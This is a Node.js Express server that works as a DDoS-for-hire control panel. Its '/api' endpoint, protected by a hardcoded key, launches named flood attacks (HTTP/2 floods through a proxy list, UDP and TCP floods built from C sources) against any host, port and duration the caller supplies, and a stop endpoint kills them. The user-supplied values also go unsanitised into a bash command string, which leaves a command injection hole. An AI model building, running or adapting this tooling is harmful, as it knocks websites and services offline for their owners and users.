const express = require('express');
const { spawn } = require('child_process');
const app = express();
const port = 2216;

const methods = {
    FLOOD: 'FLOOD.js',
    HTTP: 'HTTP.js',
    MIXBIL: 'MIXBIL.js',
    UAM: 'UAM.js',
    RAW: 'RAW.js',
    STATRUM: 'STATRUM.js',
    H2CIKO: 'H2CIKO.js',
    H2FLASH: 'H2FLASH.js',
    H2GECKO: 'H2GECKO.js',
    H2RAPID: 'H2RAPID.js',
    H2FLOOD: 'H2FLOOD.js',
    UDP: 'udp.c',
    TCP: 'tcp.c'
};

const activeProcesses = new Map();

const generateCommand = (method, host, port, time) => {
    switch (method) {
        case 'FLOOD':
            return `cd /root/.trash && node FLOOD.js ${host} ${time} 32 2 proxy.txt`;
        case 'RAW':
            return `cd /root/.trash && node RAW.js ${host} ${time}`;
        case 'HTTP':
            return `cd /root/.trash && node HTTP.js ${host} ${time} 32 2 proxy.txt`;
        case 'MIXBIL':
            return `cd /root/.trash && node MIXBIL.js ${host} ${time} 8 4 proxy.txt`;
        case 'UAM':
            return `cd /root/.trash && node UAM.js ${host} ${time} 32 2 proxy.txt`;
        case 'STATRUM':
            return `cd /root/.trash && node STATRUM.js ${host} ${time} 32 2 proxy.txt`;
        case 'H2CIKO':
            return `cd /root/.trash && node H2CIKO.js ${host} ${time} 4 64 proxy.txt`;
        case 'H2FLASH':
            return `cd /root/.trash && node H2FLASH.js ${host} ${time} 8 8 proxy.txt`;
        case 'H2GECKO':
            return `cd /root/.trash && node H2GECKO.js ${host} ${time} 32 2 proxy.txt`;
        case 'H2RAPID':
            return `cd /root/.trash && node H2RAPID.js ${host} ${time} 32 2 proxy.txt`;
        case 'H2FLOOD':
            return `cd /root/.trash && node H2FLOOD.js ${host} ${time} 32 2 proxy.txt`;
        case 'UDP':
            return `cd /root/.trash && gcc udp.c -o udp && ./udp ${host} ${port} ${time}`;
        case 'TCP':
            return `cd /root/.trash && gcc tcp.c -o tcp && ./tcp ${host} ${port} 2 ${time}`;
        default:
            return `cd /root/.trash && node ${methods[method]} ${host} ${time}`;
    }
};

app.get('/api', (req, res) => {
    const key = req.query.key;
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;

    if (key !== 'xyran') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (!methods[method]) {
        return res.status(400).json({ error: 'Unknown method' });
    }

    res.json({
        status: 'Attack initiated',
        host: host,
        port: port,
        time: time,
        method: method,
    });

    const command = generateCommand(method, host, port, time);
    const process = spawn('bash', ['-c', command], { detached: true });

    process.stdout.on('data', (data) => {
        console.log(`Stdout: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`Stderr: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`Process exited with code ${code}`);
    });

    activeProcesses.set(process.pid, process);
});

app.get('/api/stop', (req, res) => {
    const key = req.query.key;

    if (key !== 'xyran') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    activeProcesses.forEach((process, pid) => {
        process.kill();
        activeProcesses.delete(pid);
    });

    res.json({ status: 'All attacks stopped.' });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});